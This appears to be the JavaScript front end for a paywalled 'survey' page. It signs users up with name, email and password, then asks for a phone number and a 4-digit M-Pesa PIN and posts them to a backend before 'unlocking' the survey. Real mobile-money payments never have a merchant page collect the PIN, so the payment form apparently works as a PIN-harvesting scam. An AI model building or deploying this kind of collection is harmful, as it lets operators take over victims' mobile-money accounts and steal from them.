(function () {
  // ---- CONFIG: point this at your backend ----
  // For Python (Flask) default: http://localhost:5000
  // For Node (Express) default: http://localhost:3000
  const API_BASE = 'http://localhost:5000/api';

  // DOM refs
  const signupSection   = document.getElementById('signupSection');
  const paywallSection  = document.getElementById('paywallSection');
  const signupForm      = document.getElementById('signupForm');
  const paymentForm     = document.getElementById('paymentForm');
  const backToSignup    = document.getElementById('backToSignup');
  const paymentSuccess  = document.getElementById('paymentSuccess');
  const paymentError    = document.getElementById('paymentError');
  const signupError     = document.getElementById('signupError');
  const tillDisplay     = document.getElementById('tillDisplay');
  const headerBadge     = document.getElementById('headerBadge');
  const payBtn          = document.getElementById('payBtn');
  const lockNotice      = document.getElementById('lockNotice');

  let sessionToken = null; // simple token storage

  // ---------- Helpers ----------
  function showError(el, msg) { el.textContent = msg; el.style.display = 'block'; }
  function hideError(el) { el.style.display = 'none'; }

  function showPaywall() {
    signupSection.classList.add('hidden');
    paywallSection.classList.add('active');
    paymentSuccess.classList.remove('show');
    hideError(paymentError);
  }

  function showSignup() {
    signupSection.classList.remove('hidden');
    paywallSection.classList.remove('active');
    paymentSuccess.classList.remove('show');
    hideError(paymentError);
    document.getElementById('mpesaPin').value = '';
  }

  function unlockSurvey() {
    document.querySelectorAll('.option-item.locked').forEach(el => {
      el.classList.remove('locked');
      const label = el.dataset.option || '';
      const textMap = { ui: 'User interface', perf: 'Performance & speed', support: 'Customer support' };
      el.innerHTML = `<i class="far fa-circle"></i> ${textMap[label] || 'Unlocked option'}`;
    });
    if (lockNotice) lockNotice.style.display = 'none';
    if (headerBadge) headerBadge.innerHTML = '<i class="fas fa-unlock"></i> full access';
  }

  // ---------- Load till number from backend ----------
  async function loadTill() {
    try {
      const res = await fetch(`${API_BASE}/till`);
      const data = await res.json();
      if (data.till) {
        tillDisplay.innerHTML = `${data.till} <small>(buy goods)</small>`;
      } else {
        tillDisplay.innerHTML = `— <small>(till unavailable)</small>`;
      }
    } catch (err) {
      tillDisplay.innerHTML = `— <small>(offline)</small>`;
      console.error('Till load error:', err);
    }
  }

  // ---------- Signup ----------
  signupForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    hideError(signupError);

    const payload = {
      name:     document.getElementById('fullName').value.trim(),
      email:    document.getElementById('email').value.trim(),
      password: document.getElementById('password').value.trim(),
    };
    if (!payload.name || !payload.email || !payload.password) {
      return showError(signupError, 'Please fill in all fields.');
    }
    if (payload.password.length < 6) {
      return showError(signupError, 'Password must be at least 6 characters.');
    }

    const btn = signupForm.querySelector('button[type="submit"]');
    const original = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Creating account...';

    try {
      const res = await fetch(`${API_BASE}/signup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Signup failed');

      sessionToken = data.token;
      // Persist (simple)
      sessionStorage.setItem('ip_token', sessionToken);
      sessionStorage.setItem('ip_email', payload.email);

      showPaywall();
      if (navigator.vibrate) navigator.vibrate(10);
    } catch (err) {
      showError(signupError, err.message);
    } finally {
      btn.disabled = false;
      btn.innerHTML = original;
    }
  });

  // ---------- Payment ----------
  paymentForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    hideError(paymentError);
    paymentSuccess.classList.remove('show');

    const phone = document.getElementById('phoneNumber').value.trim();
    const pin   = document.getElementById('mpesaPin').value.trim();

    if (!phone || phone.replace(/\D/g, '').length < 9) {
      return showError(paymentError, 'Please enter a valid phone number.');
    }
    if (!pin || pin.length !== 4) {
      return showError(paymentError, 'PIN must be exactly 4 digits.');
    }
    if (!sessionToken) {
      return showError(paymentError, 'Session expired. Please sign up again.');
    }

    const original = payBtn.innerHTML;
    payBtn.disabled = true;
    payBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processing payment...';

    try {
      const res = await fetch(`${API_BASE}/pay`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${sessionToken}`,
        },
        body: JSON.stringify({ phone, pin }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Payment failed');

      paymentSuccess.classList.add('show');
      unlockSurvey();
      if (navigator.vibrate) navigator.vibrate([15, 30, 15]);
    } catch (err) {
      showError(paymentError, err.message);
    } finally {
      payBtn.disabled = false;
      payBtn.innerHTML = original;
    }
  });

  // ---------- Navigation ----------
  backToSignup.addEventListener('click', showSignup);

  // ---------- Init ----------
  (function init() {
    showSignup();
    loadTill();
    // Restore token if any
    const saved = sessionStorage.getItem('ip_token');
    if (saved) sessionToken = saved;
  })();
})();
